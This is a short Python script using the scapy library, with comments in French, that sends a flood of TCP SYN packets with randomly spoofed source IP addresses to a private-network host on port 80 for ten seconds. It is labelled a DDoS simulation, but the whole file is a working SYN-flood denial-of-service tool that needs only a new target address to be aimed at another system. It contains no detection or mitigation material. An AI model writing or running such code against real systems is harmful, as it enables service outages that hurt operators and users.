from scapy.all import IP, TCP, send
import random
import time

# Configuration de l'attaque
target_ip = "192.168.1.81"  # Adresse cible
target_port = 80         # Port cible
flood_duration = 10      # Durée de l'attaque (secondes)

# Générer des IP sources aléatoires
def generate_random_ip():
    return ".".join([str(random.randint(1, 254)) for _ in range(4)])

# Envoi massif de paquets TCP SYN
def simulate_ddos(target_ip, target_port, duration):
    start_time = time.time()
    packet_count = 0
    print("Starting DDoS simulation...")

    while time.time() - start_time < duration:
        src_ip = generate_random_ip()
        packet = IP(src=src_ip, dst=target_ip) / TCP(dport=target_port, flags="S")
        send(packet, verbose=0)  # Envoi silencieux du paquet
        packet_count += 1

        if packet_count % 1000 == 0:
            print(f"Sent {packet_count} packets so far...")

    print(f"Attack finished. Total packets sent: {packet_count}")

# Lancer l'attaque
if __name__ == "__main__":
    simulate_ddos(target_ip, target_port, flood_duration)
